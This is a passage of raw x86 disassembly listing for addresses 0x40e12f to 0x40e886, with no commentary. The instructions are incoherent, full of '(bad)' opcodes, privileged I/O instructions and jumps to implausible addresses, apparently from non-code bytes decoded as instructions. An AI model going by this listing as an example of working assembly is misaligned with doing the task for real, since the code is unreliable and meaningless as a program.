  40e12f:	shl    BYTE PTR [ebp+eiz*2-0xd4f050],1
  40e136:	data16 sbb al,0xf6
  40e139:	test   cl,ah
  40e13b:	shl    esp,0xb3
  40e13e:	into   
  40e13f:	out    dx,al
  40e140:	pop    esi
  40e141:	shl    bh,cl
  40e143:	ins    BYTE PTR es:[edi],dx
  40e144:	inc    ebx
  40e145:	jmp    0xa3c54df3
  40e14a:	inc    edx
  40e14b:	sbb    esp,DWORD PTR [esi+0x508bd7eb]
  40e151:	pop    es
  40e152:	test   BYTE PTR [ebx+0x5457422d],0x82
  40e159:	icebp  
  40e15a:	aad    0x42
  40e15c:	sbb    edx,DWORD PTR [esi]
  40e15e:	mov    ah,0xa4
  40e160:	xchg   edx,eax
  40e161:	ret    
  40e162:	xchg   esi,eax
  40e163:	rcl    BYTE PTR [ebx],cl
  40e165:	xor    al,0xb
  40e167:	das    
  40e168:	int    0x9c
  40e16a:	cmc    
  40e16b:	jmp    0x64c6358
  40e170:	sub    ch,BYTE PTR [ecx+esi*4+0x55ce1a1e]
  40e177:	sub    bl,ah
  40e179:	dec    eax
  40e17a:	inc    edx
  40e17b:	lods   al,BYTE PTR ds:[esi]
  40e17c:	lds    esp,FWORD PTR [ebp-0x3a]
  40e17f:	shl    DWORD PTR [ebp+0x2a024b4],0xf3
  40e186:	or     DWORD PTR [ecx+0xbcfeb86],ebp
  40e18c:	arpl   WORD PTR [ebp-0x5d60e4a9],di
  40e192:	push   edx
  40e193:	xchg   edi,eax
  40e194:	lds    ebp,FWORD PTR [ebp-0x2ea1d90f]
  40e19a:	ret    0xaf80
  40e19d:	dec    ecx
  40e19e:	cli    
  40e19f:	nop
  40e1a0:	pop    ebp
  40e1a1:	push   ebp
  40e1a2:	cmp    BYTE PTR [esi-0x3587d253],0x7f
  40e1a9:	fistp  WORD PTR [esp+eiz*2]
  40e1ac:	retf   
  40e1ad:	ss out dx,al
  40e1af:	fdivr  QWORD PTR [ecx+0x2c54765]
  40e1b5:	mov    edi,esi
  40e1b7:	loopne 0x40e13a
  40e1b9:	jb     0x40e222
  40e1bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1bc:	je     0x40e188
  40e1be:	sub    eax,0x5e629dc5
  40e1c3:	pop    ds
  40e1c4:	mov    al,BYTE PTR [ebp+0x44]
  40e1c7:	cmp    ah,BYTE PTR ds:0xcfdbc6a4
  40e1cd:	xor    ecx,DWORD PTR [ebx+0x747ded7b]
  40e1d3:	push   ecx
  40e1d4:	adc    edx,DWORD PTR [ebx-0x2d86220c]
  40e1da:	sahf   
  40e1db:	sub    al,0x59
  40e1dd:	dec    ebx
  40e1de:	fldenv [esi-0x7]
  40e1e1:	hlt    
  40e1e2:	add    BYTE PTR [edx],0x33
  40e1e5:	cld    
  40e1e6:	push   DWORD PTR [ecx+0x4e9265b9]
  40e1ec:	and    DWORD PTR fs:[edi+0x2e5496c0],esp
  40e1f3:	scas   al,BYTE PTR es:[edi]
  40e1f4:	das    
  40e1f5:	je     0x40e1bb
  40e1f7:	lods   eax,DWORD PTR ss:[esi]
  40e1f9:	jl     0x40e224
  40e1fb:	xor    al,dh
  40e1fd:	push   ss
  40e1fe:	adc    ecx,esi
  40e200:	mov    dl,0xb5
  40e202:	xor    BYTE PTR [ebx+eiz*2-0x7c],ch
  40e206:	arpl   dx,dx
  40e208:	pop    ss
  40e209:	daa    
  40e20a:	rcr    dh,1
  40e20c:	and    ah,al
  40e20e:	loopne 0x40e23e
  40e210:	push   edi
  40e211:	mov    al,0x15
  40e213:	dec    ebx
  40e214:	lea    ecx,[eax+eiz*4+0x613ee49]
  40e21b:	xchg   edx,eax
  40e21c:	out    dx,eax
  40e21d:	jmp    0x40e1df
  40e21f:	stos   DWORD PTR es:[edi],eax
  40e220:	scas   al,BYTE PTR es:[edi]
  40e221:	les    edx,FWORD PTR [eax]
  40e223:	push   edi
  40e224:	or     eax,eax
  40e226:	aaa    
  40e227:	dec    esp
  40e228:	int3   
  40e229:	into   
  40e22a:	ins    DWORD PTR es:[edi],dx
  40e22b:	lds    ebx,FWORD PTR [ebx-0x3a]
  40e22e:	inc    ebp
  40e22f:	aad    0x4d
  40e231:	jne    0x40e208
  40e233:	fcomp  DWORD PTR [ecx]
  40e235:	dec    ecx
  40e236:	cmp    esi,DWORD PTR [si+0x16eb]
  40e23b:	lds    ecx,FWORD PTR [edx+0x5a736fdb]
  40e241:	push   0x47
  40e243:	es stc 
  40e245:	int    0x63
  40e247:	dec    esi
  40e248:	test   eax,0x1f8b35dc
  40e24d:	leave  
  40e24e:	xor    esp,DWORD PTR [esi]
  40e250:	add    eax,0xb092f350
  40e255:	dec    ebp
  40e256:	pusha  
  40e257:	jle    0x40e234
  40e259:	int3   
  40e25a:	jmp    0x40e295
  40e25c:	mov    edi,0x2e8a1
  40e261:	push   0xffffffb0
  40e263:	push   0x52ac10cf
  40e268:	pop    ebx
  40e269:	int    0x3d
  40e26b:	cs jae 0x40e1ff
  40e26e:	push   ds
  40e26f:	cmp    bl,BYTE PTR [ecx-0x6881fd12]
  40e275:	cmp    al,0xb3
  40e277:	ins    BYTE PTR es:[edi],dx
  40e278:	cdq    
  40e279:	jge    0x40e26e
  40e27b:	sbb    DWORD PTR [ecx-0x6aeb9338],0xffffffd0
  40e282:	jb     0x40e273
  40e284:	adc    BYTE PTR [ecx],0x1
  40e287:	clc    
  40e288:	adc    DWORD PTR [ebx-0x51219a3c],eax
  40e28e:	cs test al,0x43
  40e291:	add    eax,0x25abd06e
  40e296:	hlt    
  40e297:	pop    ebp
  40e298:	xor    BYTE PTR [ecx],bh
  40e29a:	add    DWORD PTR [esi+0x2243f009],edi
  40e2a0:	(bad)  
  40e2a1:	outs   dx,DWORD PTR ds:[esi]
  40e2a2:	add    eax,0xa543c033
  40e2a7:	mov    ebp,0xfdc50632
  40e2ac:	out    0x1c,eax
  40e2ae:	xchg   ebx,eax
  40e2af:	imul   ebx,esp,0x334011ca
  40e2b5:	pop    ebx
  40e2b6:	shr    DWORD PTR [edx+0x3b],1
  40e2b9:	out    dx,al
  40e2ba:	test   al,0x92
  40e2bc:	popa   
  40e2bd:	in     eax,dx
  40e2be:	sub    BYTE PTR [ebp+ebx*4-0x185fd8bd],0x46
  40e2c6:	in     eax,dx
  40e2c7:	push   ss
  40e2c8:	xor    ecx,DWORD PTR [edx+edi*8]
  40e2cb:	inc    esp
  40e2cc:	push   ebx
  40e2cd:	sub    ch,BYTE PTR [ebp+edx*8+0x28b154e6]
  40e2d4:	popa   
  40e2d5:	sbb    bl,dl
  40e2d7:	xor    eax,0xb636418
  40e2dc:	and    al,0xbc
  40e2de:	gs push edx
  40e2e0:	loop   0x40e2d3
  40e2e2:	mov    edi,0x2eaa95cf
  40e2e7:	mov    eax,ds:0xaa961ee0
  40e2ec:	lahf   
  40e2ed:	inc    ebp
  40e2ee:	std    
  40e2ef:	pop    esi
  40e2f0:	jle    0x40e2bd
  40e2f2:	imul   ebp,DWORD PTR [edi],0x2994cfb5
  40e2f8:	adc    eax,0xd254d03b
  40e2fd:	push   es
  40e2fe:	(bad)  
  40e2ff:	xchg   DWORD PTR [edx+edi*1-0x1f4925a8],esp
  40e306:	or     DWORD PTR [ecx],ebp
  40e308:	outs   dx,DWORD PTR ds:[esi]
  40e309:	aam    0x5b
  40e30b:	push   ecx
  40e30c:	mov    DWORD PTR [ebp-0x3ae271ef],esp
  40e312:	and    DWORD PTR [eax-0x61134d46],edx
  40e318:	into   
  40e319:	mov    bl,0xf6
  40e31b:	or     cl,BYTE PTR [esi+0x1568a2e4]
  40e321:	cmp    al,0x80
  40e323:	lock fs sub eax,0xc9fec1a6
  40e32a:	xchg   BYTE PTR [esi],dh
  40e32c:	ins    DWORD PTR es:[edi],dx
  40e32d:	pop    ebp
  40e32e:	jnp    0x40e30b
  40e330:	pop    edi
  40e331:	jecxz  0x40e395
  40e333:	(bad)  
  40e334:	xor    al,0x9c
  40e336:	sbb    DWORD PTR [esi],ecx
  40e338:	(bad)  
  40e339:	cmc    
  40e33a:	inc    ebx
  40e33b:	fcom   QWORD PTR [ecx-0x3]
  40e33e:	xchg   edx,eax
  40e33f:	jecxz  0x40e35e
  40e341:	or     edi,DWORD PTR [esi-0x71ac75a]
  40e347:	cmp    eax,DWORD PTR [ebx-0x5062f21]
  40e34d:	int    0x58
  40e34f:	lock inc ecx
  40e351:	aaa    
  40e352:	jge    0x40e348
  40e354:	pop    eax
  40e355:	dec    edx
  40e356:	popf   
  40e357:	sbb    eax,0x6f017f41
  40e35c:	or     ebp,edi
  40e35e:	mov    al,0x2d
  40e360:	icebp  
  40e361:	fdiv   DWORD PTR [eax-0x20]
  40e364:	lock fdiv DWORD PTR [esi-0x10904f0e]
  40e36b:	cmp    eax,0xb7f10d8f
  40e370:	aam    0x2
  40e372:	imul   esp,ebx,0xffffffb7
  40e375:	or     al,BYTE PTR [ebp-0x408fec62]
  40e37b:	cld    
  40e37c:	add    DWORD PTR [esp+edi*1],0xcaa3ea04
  40e383:	add    DWORD PTR [edi-0x5e],0x6db1566a
  40e38a:	mov    WORD PTR [ebx],ds
  40e38c:	ja     0x40e3bd
  40e38e:	dec    ecx
  40e38f:	sbb    BYTE PTR [edi-0x6],ch
  40e392:	test   bh,cl
  40e394:	jns    0x40e3b9
  40e396:	cmp    eax,ebx
  40e398:	pop    ss
  40e399:	or     dh,ch
  40e39b:	mov    esp,0x435c8b57
  40e3a0:	or     al,al
  40e3a2:	out    dx,eax
  40e3a3:	pop    esp
  40e3a4:	stos   DWORD PTR es:[edi],eax
  40e3a5:	retf   
  40e3a6:	test   BYTE PTR [ebx],cl
  40e3a8:	xchg   DWORD PTR [esi+0x4b6de667],edx
  40e3ae:	aam    0xf3
  40e3b0:	idiv   BYTE PTR [ecx+0x8844d2e]
  40e3b6:	mov    dl,0x22
  40e3b8:	sub    ebx,DWORD PTR [edx]
  40e3ba:	push   edi
  40e3bb:	mov    edi,0x485a0b32
  40e3c0:	pusha  
  40e3c1:	loope  0x40e354
  40e3c3:	sbb    ecx,DWORD PTR [esi+esi*4]
  40e3c6:	pop    ss
  40e3c7:	ror    DWORD PTR [ebp-0x977b],cl
  40e3cd:	(bad)  
  40e3ce:	jmp    0x40e8d9
  40e3d3:	into   
  40e3d4:	leave  
  40e3d5:	ds cmp eax,0xd9cdc9d9
  40e3db:	xor    al,0xff
  40e3dd:	xchg   ebp,eax
  40e3de:	xor    esi,DWORD PTR [esi+0x1adba2b2]
  40e3e4:	inc    esi
  40e3e5:	js     0x40e45f
  40e3e7:	push   0x7c
  40e3e9:	js     0x40e463
  40e3eb:	push   eax
  40e3ec:	pop    ss
  40e3ed:	mov    ah,ah
  40e3ef:	xor    ch,BYTE PTR [ebp+0x49]
  40e3f2:	inc    ebx
  40e3f3:	mov    ebx,DWORD PTR [edi-0x7]
  40e3f6:	dec    esp
  40e3f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3f8:	push   0xffffffb0
  40e3fa:	dec    edx
  40e3fb:	cmp    eax,0x4fadb162
  40e400:	jl     0x40e47d
  40e402:	mov    ebx,DWORD PTR [eax-0x37ab97ea]
  40e408:	jmp    0x40e478
  40e40a:	shl    DWORD PTR [ebp+eax*1-0x4649d6aa],0x4c
  40e412:	das    
  40e413:	out    0xc6,eax
  40e415:	data16 mov BYTE PTR [ecx],bh
  40e418:	or     al,0x53
  40e41a:	out    0xf3,eax
  40e41c:	imul   ecx,DWORD PTR [eax],0x1f
  40e41f:	dec    ebp
  40e420:	pop    esi
  40e421:	and    eax,0xb043b722
  40e426:	adc    ah,BYTE PTR [ebx+esi*1]
  40e429:	push   ds
  40e42a:	test   eax,0x78d43cd0
  40e42f:	or     eax,eax
  40e431:	nop
  40e432:	mov    edi,0x60696fda
  40e437:	jbe    0x40e427
  40e439:	sub    BYTE PTR [edi],0x3a
  40e43c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e43d:	dec    eax
  40e43e:	adc    al,BYTE PTR [ebp-0x45]
  40e441:	mov    bh,0x54
  40e443:	push   ecx
  40e444:	(bad)  
  40e445:	ror    ch,1
  40e447:	xchg   ebx,eax
  40e448:	imul   esi,DWORD PTR [ebp-0x77b9c239],0xaa0ccfb0
  40e452:	cs sti 
  40e454:	sub    ch,al
  40e456:	mov    bh,BYTE PTR [edi]
  40e458:	in     eax,0x94
  40e45a:	bound  edi,QWORD PTR [esi+0xbe4209c]
  40e460:	and    edi,edx
  40e462:	enter  0x7ef2,0x4c
  40e466:	stos   DWORD PTR es:[edi],eax
  40e467:	mov    esi,esi
  40e469:	push   ebp
  40e46a:	add    al,0x77
  40e46c:	add    eax,0xc2d02f6d
  40e471:	or     eax,0x618af76b
  40e476:	fld    DWORD PTR [esi+0x78e14857]
  40e47c:	leave  
  40e47d:	jle    0x40e45a
  40e47f:	jo     0x40e4b5
  40e481:	cmp    eax,0xc99615f6
  40e486:	and    DWORD PTR [esp+ecx*2],esi
  40e489:	retf   0x9260
  40e48c:	mov    edi,esp
  40e48e:	jle    0x40e4d5
  40e490:	or     ebp,DWORD PTR [ebx+ecx*2]
  40e493:	xlat   BYTE PTR ds:[ebx]
  40e494:	aaa    
  40e495:	inc    ebx
  40e496:	and    al,0xa8
  40e498:	cmc    
  40e499:	jecxz  0x40e492
  40e49b:	loopne 0x40e4d8
  40e49d:	shr    DWORD PTR [ecx+0x203a8a43],0xdd
  40e4a4:	(bad)  
  40e4a5:	sti    
  40e4a6:	dec    eax
  40e4a7:	(bad)  
  40e4a8:	and    bl,cl
  40e4aa:	inc    eax
  40e4ab:	xchg   esp,eax
  40e4ac:	inc    esp
  40e4ad:	mov    al,0x97
  40e4af:	push   esp
  40e4b0:	mov    esp,0x7324ccf4
  40e4b5:	cmp    al,0xba
  40e4b7:	xchg   esp,eax
  40e4b8:	cli    
  40e4b9:	ins    BYTE PTR es:[edi],dx
  40e4ba:	lods   al,BYTE PTR ds:[esi]
  40e4bb:	out    dx,eax
  40e4bc:	mov    dl,0xdb
  40e4be:	(bad)  
  40e4bf:	sub    DWORD PTR [esi],ecx
  40e4c1:	mov    bh,al
  40e4c3:	lods   al,BYTE PTR ds:[esi]
  40e4c4:	dec    edx
  40e4c5:	in     al,0xca
  40e4c7:	outs   dx,BYTE PTR ds:[esi]
  40e4c8:	xchg   DWORD PTR [edi],esi
  40e4ca:	das    
  40e4cb:	mov    eax,0xb02f1d90
  40e4d0:	outs   dx,BYTE PTR ds:[esi]
  40e4d1:	push   edi
  40e4d2:	stc    
  40e4d3:	mov    eax,0x1565dd07
  40e4d8:	popa   
  40e4d9:	repz imul eax,DWORD PTR [edx+edi*4],0xffffff81
  40e4de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4df:	push   ebx
  40e4e0:	xchg   ecx,eax
  40e4e1:	sbb    DWORD PTR [ebp+0x2f2e1bdb],0xffffff82
  40e4e8:	jno    0x40e4df
  40e4ea:	les    eax,FWORD PTR [ecx]
  40e4ec:	fnsave [edx]
  40e4ee:	jle    0x40e4e6
  40e4f0:	sub    BYTE PTR [eax-0x1f96c140],ah
  40e4f6:	push   0x9f0e296
  40e4fb:	mov    ds:0x168dbfbd,al
  40e500:	cld    
  40e501:	adc    eax,DWORD PTR [eax+0x66]
  40e504:	and    DWORD PTR [edx],ebp
  40e506:	inc    ecx
  40e507:	stc    
  40e508:	adc    edx,DWORD PTR [edi-0x64]
  40e50b:	pop    ds
  40e50c:	pop    es
  40e50d:	sbb    al,0x62
  40e50f:	mov    dh,0x16
  40e511:	mov    ds:0x7f128527,al
  40e516:	es push cs
  40e518:	inc    edx
  40e519:	scas   al,BYTE PTR es:[edi]
  40e51a:	rol    BYTE PTR [esi],cl
  40e51c:	fld    DWORD PTR [ebx]
  40e51e:	test   al,0x9e
  40e520:	push   ebp
  40e521:	loopne 0x40e4f6
  40e523:	dec    ecx
  40e524:	ror    ebx,1
  40e526:	jns    0x40e571
  40e528:	inc    eax
  40e529:	ins    BYTE PTR es:[edi],dx
  40e52a:	dec    ebp
  40e52b:	outs   dx,DWORD PTR ds:[esi]
  40e52c:	dec    si
  40e52e:	mov    cl,0x2b
  40e530:	(bad)  
  40e531:	mov    eax,edx
  40e533:	xchg   esi,eax
  40e534:	arpl   WORD PTR [ebp+ebx*8+0xa38ea1b],di
  40e53b:	fs jo  0x40e502
  40e53e:	aas    
  40e53f:	int    0x56
  40e541:	jecxz  0x40e528
  40e543:	sub    BYTE PTR [eax+edi*1],dl
  40e546:	inc    esp
  40e547:	fidiv  DWORD PTR [ebx+edi*4+0x5376f1f4]
  40e54f:	dec    ecx
  40e550:	jbe    0x40e5a1
  40e552:	aam    0xc9
  40e554:	pop    eax
  40e555:	cwde   
  40e556:	inc    edi
  40e557:	fsubr  QWORD PTR [esi+0x1e]
  40e55a:	dec    ebx
  40e55b:	or     DWORD PTR [bx],ecx
  40e55e:	les    eax,FWORD PTR [edi+0x603f9b5c]
  40e564:	outs   dx,BYTE PTR ds:[esi]
  40e565:	push   ss
  40e566:	mov    edx,DWORD PTR [edx+0x3f6f1c1d]
  40e56c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e56d:	loopne 0x40e56c
  40e56f:	(bad)  
  40e570:	into   
  40e571:	adc    DWORD PTR [ebx-0x7b1ca5df],edx
  40e577:	lahf   
  40e578:	push   0x9776b032
  40e57d:	lahf   
  40e57e:	lods   al,BYTE PTR ds:[esi]
  40e57f:	fist   WORD PTR [ebp+esi*2+0x53]
  40e583:	add    ebx,eax
  40e585:	ret    0x3a75
  40e588:	loop   0x40e539
  40e58a:	or     ebp,DWORD PTR [eax]
  40e58c:	mov    eax,ds:0x591758bc
  40e591:	fstp   st(5)
  40e593:	jl     0x40e56c
  40e595:	fstp   QWORD PTR [ecx-0x58]
  40e598:	inc    edi
  40e599:	in     al,0x64
  40e59b:	jmp    0x40e57d
  40e59d:	and    BYTE PTR [esi+0x8c01ada],ch
  40e5a3:	xchg   esp,eax
  40e5a4:	or     dl,BYTE PTR [ecx]
  40e5a6:	popa   
  40e5a7:	lahf   
  40e5a8:	(bad)  [edx]
  40e5aa:	stos   DWORD PTR es:[edi],eax
  40e5ab:	push   ss
  40e5ac:	push   esi
  40e5ad:	and    al,0x30
  40e5af:	test   BYTE PTR [ecx],dh
  40e5b1:	enter  0x472d,0xee
  40e5b5:	gs shr cl,0xd9
  40e5b9:	mov    ebp,0xcd84c57a
  40e5be:	(bad)  
  40e5c0:	icebp  
  40e5c1:	les    esp,FWORD PTR [edx]
  40e5c3:	gs into 
  40e5c5:	pop    ebp
  40e5c6:	xchg   esi,eax
  40e5c7:	mov    dl,0x4
  40e5c9:	nop
  40e5ca:	dec    esi
  40e5cb:	xchg   esi,eax
  40e5cc:	stos   BYTE PTR es:[edi],al
  40e5cd:	sti    
  40e5ce:	xchg   ebp,eax
  40e5cf:	fld    DWORD PTR cs:[esi]
  40e5d2:	or     ecx,DWORD PTR ds:0x93c3592e
  40e5d8:	shl    BYTE PTR [edi+0x7c],1
  40e5db:	jne    0x40e5f3
  40e5dd:	js     0x40e584
  40e5df:	jp     0x40e59e
  40e5e1:	mov    eax,0x7be960eb
  40e5e6:	(bad)  [esp+edx*2]
  40e5e9:	out    0x10,eax
  40e5eb:	jp     0x40e606
  40e5ed:	sub    edx,esi
  40e5ef:	retf   
  40e5f0:	pop    ss
  40e5f1:	dec    esp
  40e5f2:	mov    ch,0x97
  40e5f4:	sub    DWORD PTR [ecx-0x53c6b10d],ecx
  40e5fa:	mov    al,0xb6
  40e5fc:	shr    DWORD PTR [edi],1
  40e5fe:	(bad)  
  40e5ff:	repnz das 
  40e601:	push   ds
  40e602:	gs jo  0x40e5f7
  40e605:	pusha  
  40e606:	adc    BYTE PTR [esi+0x7e],dl
  40e609:	xchg   ebx,eax
  40e60a:	push   edi
  40e60b:	sbb    BYTE PTR ds:0x397ed7f9,ch
  40e611:	cwde   
  40e612:	xchg   ecx,eax
  40e613:	bnd jns 0x40e5f1
  40e616:	pop    ss
  40e617:	xchg   ecx,eax
  40e618:	mov    al,ds:0x193be988
  40e61d:	adc    dl,ah
  40e61f:	aas    
  40e620:	xor    eax,DWORD PTR [esi]
  40e622:	iret   
  40e623:	outs   dx,DWORD PTR ds:[esi]
  40e624:	mov    ebp,0xcf0eb1fb
  40e629:	push   es
  40e62a:	inc    esi
  40e62b:	jno    0x40e5f4
  40e62d:	sti    
  40e62e:	pop    ebx
  40e62f:	icebp  
  40e630:	fistp  WORD PTR [esi-0x61c9ab38]
  40e636:	cmp    bl,ah
  40e638:	and    eax,esp
  40e63a:	repnz out dx,al
  40e63c:	or     BYTE PTR [eax-0x4e],dl
  40e63f:	xor    al,0x65
  40e641:	je     0x40e669
  40e643:	ins    BYTE PTR es:[edi],dx
  40e644:	mov    ebp,0x1b328e6c
  40e649:	test   BYTE PTR [esi-0x20cad14c],al
  40e64f:	dec    edx
  40e650:	push   ebx
  40e651:	ss inc esp
  40e653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e654:	aaa    
  40e655:	pop    eax
  40e656:	into   
  40e657:	pop    ds
  40e658:	xor    DWORD PTR [edi],ebp
  40e65a:	(bad)  
  40e65b:	jle    0x40e648
  40e65d:	dec    ebp
  40e65e:	pop    ss
  40e65f:	mov    ebx,0x1ff3c416
  40e664:	pop    ss
  40e665:	pop    esp
  40e666:	dec    eax
  40e667:	cmp    BYTE PTR [ecx+0x11],al
  40e66a:	add    DWORD PTR [edi-0x42],eax
  40e66d:	call   0x42517c51
  40e672:	aad    0x56
  40e674:	aas    
  40e675:	mov    ebp,DWORD PTR [ecx-0xaf6f55]
  40e67b:	jb     0x40e64c
  40e67d:	and    BYTE PTR [esp+eax*4-0xca9ebda],dl
  40e684:	mov    DWORD PTR [edx+esi*2-0x21],esp
  40e688:	das    
  40e689:	and    dl,BYTE PTR [edi+edx*4-0x6d578d86]
  40e690:	in     al,0x2e
  40e692:	(bad)  
  40e693:	add    al,BYTE PTR [ebx+0x58]
  40e696:	xor    DWORD PTR [eax],esi
  40e698:	or     DWORD PTR [ebx],edi
  40e69a:	push   eax
  40e69c:	lds    ebx,FWORD PTR [edx]
  40e69e:	loop   0x40e6b0
  40e6a0:	and    esi,DWORD PTR [eax+eiz*1+0x6412d189]
  40e6a7:	fild   WORD PTR [ebp-0x19]
  40e6aa:	cmc    
  40e6ab:	cwde   
  40e6ac:	jb     0x40e64f
  40e6ae:	jb     0x40e6a8
  40e6b0:	sub    al,0x3f
  40e6b2:	or     eax,0xce69af16
  40e6b7:	mov    esp,0xa7e67a7f
  40e6bc:	std    
  40e6bd:	mov    dl,0xc4
  40e6bf:	lods   al,BYTE PTR ds:[esi]
  40e6c0:	pop    ebx
  40e6c1:	mov    al,0x89
  40e6c3:	daa    
  40e6c4:	ret    
  40e6c5:	adc    eax,0xf08ece7a
  40e6ca:	xor    ecx,DWORD PTR [edi]
  40e6cc:	mov    dl,0x3c
  40e6ce:	(bad)  
  40e6cf:	and    al,0xcf
  40e6d1:	fs push esi
  40e6d3:	xchg   esp,eax
  40e6d4:	fnstsw WORD PTR [edi+0x330007ad]
  40e6da:	push   ebx
  40e6db:	test   BYTE PTR [ebx+0xf],ch
  40e6de:	lahf   
  40e6df:	sar    DWORD PTR [eax+0x65],1
  40e6e2:	dec    esi
  40e6e3:	sub    dl,dh
  40e6e5:	pusha  
  40e6e6:	add    DWORD PTR [ecx-0x31],esi
  40e6e9:	and    edi,ebx
  40e6eb:	mov    ch,0x1e
  40e6ed:	inc    esi
  40e6ee:	mov    eax,0xacc9f75a
  40e6f3:	cmp    DWORD PTR [ebx],eax
  40e6f5:	out    dx,al
  40e6f6:	icebp  
  40e6f7:	add    ch,ah
  40e6f9:	fiadd  DWORD PTR [ecx]
  40e6fb:	jno    0x40e6d2
  40e6fd:	jp     0x40e6eb
  40e6ff:	xor    eax,0x80bc7daa
  40e704:	shl    edi,cl
  40e706:	lea    ecx,[ecx]
  40e708:	sub    al,0x54
  40e70a:	repnz (bad) 
  40e70d:	add    eax,0x151a5451
  40e712:	jl     0x40e749
  40e714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e715:	scas   eax,DWORD PTR es:[edi]
  40e716:	fidiv  DWORD PTR [esi-0x7]
  40e719:	lahf   
  40e71a:	int    0x9d
  40e71c:	test   eax,0xf0ef4418
  40e721:	int3   
  40e722:	daa    
  40e723:	xchg   ebx,eax
  40e724:	ins    DWORD PTR es:[edi],dx
  40e725:	xor    dh,ch
  40e727:	xchg   ecx,esi
  40e729:	inc    edx
  40e72a:	sub    dh,BYTE PTR [ebp+0x74def10d]
  40e730:	pop    es
  40e731:	xor    BYTE PTR [eax],dh
  40e733:	jge    0x40e6cb
  40e735:	add    al,0xe8
  40e737:	jne    0x40e712
  40e739:	adc    BYTE PTR [eax-0x3d688960],bh
  40e73f:	mov    eax,0x1c42f0f8
  40e744:	scas   eax,DWORD PTR es:[edi]
  40e745:	pop    edi
  40e746:	int3   
  40e747:	mov    ebp,0x13480afc
  40e74c:	inc    esp
  40e74d:	xchg   edi,eax
  40e74e:	je     0x40e757
  40e750:	js     0x40e6d6
  40e752:	call   0x9aff:0xc49b7102
  40e759:	test   al,0xd8
  40e75b:	cli    
  40e75c:	cmp    al,0x22
  40e75e:	mov    ss,WORD PTR [edi+eax*1-0x56]
  40e762:	aaa    
  40e763:	in     eax,0x48
  40e765:	xchg   ebx,eax
  40e766:	mov    eax,DWORD PTR [eax-0x62]
  40e769:	std    
  40e76a:	pusha  
  40e76b:	aaa    
  40e76c:	fldcw  WORD PTR [edx+0x58f128cc]
  40e772:	inc    eax
  40e773:	ds adc eax,0x5bbd4ad8
  40e779:	mov    ah,0x2d
  40e77b:	repnz rol DWORD PTR [eax],1
  40e77e:	stos   DWORD PTR es:[edi],eax
  40e77f:	xchg   ebp,eax
  40e780:	es ins DWORD PTR es:[edi],dx
  40e782:	repz mov ds:0xe3d24232,al
  40e788:	test   BYTE PTR [ebx-0x4b],0xf0
  40e78c:	aad    0xc0
  40e78e:	mov    al,es:0x182b2c92
  40e794:	call   0xf5e1:0xd72c34c0
  40e79b:	mov    eax,0x81a8daa3
  40e7a0:	mov    esi,0x34376e93
  40e7a5:	xor    DWORD PTR [ecx+0x1243f594],esp
  40e7ab:	mov    WORD PTR [esi+0x2],ss
  40e7ae:	aam    0x3a
  40e7b0:	nop
  40e7b1:	imul   ecx,edi,0x7a94c47f
  40e7b7:	test   BYTE PTR [esi-0x4b],bl
  40e7ba:	mov    ebp,0x4d0dfcf9
  40e7bf:	pop    ebp
  40e7c0:	pop    ss
  40e7c1:	mov    ss,WORD PTR [edi-0xd]
  40e7c4:	mov    ebp,0xb200de0e
  40e7c9:	and    ebx,esp
  40e7cb:	int    0x89
  40e7cd:	gs jmp 0xfc7c:0x40ac40c1
  40e7d5:	enter  0x750c,0xc0
  40e7d9:	call   0x2ab5ee27
  40e7de:	(bad)  
  40e7df:	mov    ah,0xe7
  40e7e1:	std    
  40e7e2:	jp     0x40e805
  40e7e4:	repnz push es
  40e7e6:	push   DWORD PTR [esi+ebp*2+0x21d56c0f]
  40e7ed:	sbb    al,0x8e
  40e7ef:	or     DWORD PTR [ebx-0x3ab2ff62],eax
  40e7f5:	mov    ebx,0xde235964
  40e7fa:	jae    0x40e84e
  40e7fc:	push   edi
  40e7fd:	mov    ds:0x971ac9ee,al
  40e802:	inc    edx
  40e803:	outs   dx,DWORD PTR ds:[esi]
  40e804:	ds or  ah,bh
  40e807:	jns    0x40e7b6
  40e809:	jae    0x40e881
  40e80b:	data16 mov bl,0x4e
  40e80e:	lods   al,BYTE PTR ds:[esi]
  40e80f:	add    al,0xd4
  40e811:	mov    ebp,fs
  40e813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e814:	mov    al,ds:0xff37c4d8
  40e819:	test   ah,dh
  40e81b:	jl     0x40e7d5
  40e81d:	aaa    
  40e81e:	dec    ecx
  40e81f:	mov    bh,dh
  40e821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e822:	or     DWORD PTR [ecx+0x3198dbe5],ebx
  40e828:	scas   eax,DWORD PTR es:[edi]
  40e829:	pop    ebx
  40e82a:	(bad)  
  40e82b:	setbe  BYTE PTR [edi+0x3350c34]
  40e832:	xor    DWORD PTR [ebx],esp
  40e834:	fcom   DWORD PTR [edi]
  40e836:	(bad)  [ecx-0x5f]
  40e839:	ins    DWORD PTR es:[edi],dx
  40e83a:	push   edi
  40e83b:	push   esp
  40e83c:	jp     0x40e8a0
  40e83e:	(bad)  
  40e83f:	aas    
  40e840:	adc    bh,BYTE PTR [edx+0x15dcc1a7]
  40e846:	xchg   esp,eax
  40e847:	cmove  esp,DWORD PTR [esi-0x31]
  40e84b:	das    
  40e84c:	call   0x7a003616
  40e851:	or     DWORD PTR [ebx+0x4ead1324],0x3
  40e858:	xor    al,0x3
  40e85a:	sub    eax,0xe4a6a31a
  40e85f:	sub    ebp,ecx
  40e861:	dec    eax
  40e862:	inc    edi
  40e863:	outs   dx,DWORD PTR ds:[esi]
  40e864:	add    al,0xdc
  40e866:	clc    
  40e867:	mov    ch,0x5d
  40e869:	sub    esi,DWORD PTR [edx+0x36]
  40e86c:	pusha  
  40e86d:	sub    edx,DWORD PTR [edi]
  40e86f:	mov    ebp,0x1edb1dbd
  40e874:	in     al,0x46
  40e876:	add    al,bh
  40e878:	xchg   edx,eax
  40e879:	mov    gs,WORD PTR [ebp-0x7326399a]
  40e87f:	dec    ecx
  40e880:	shl    DWORD PTR [edx],1
  40e882:	jle    0x40e8f4
  40e884:	jg     0x40e870
  40e886:	mov    ch,al
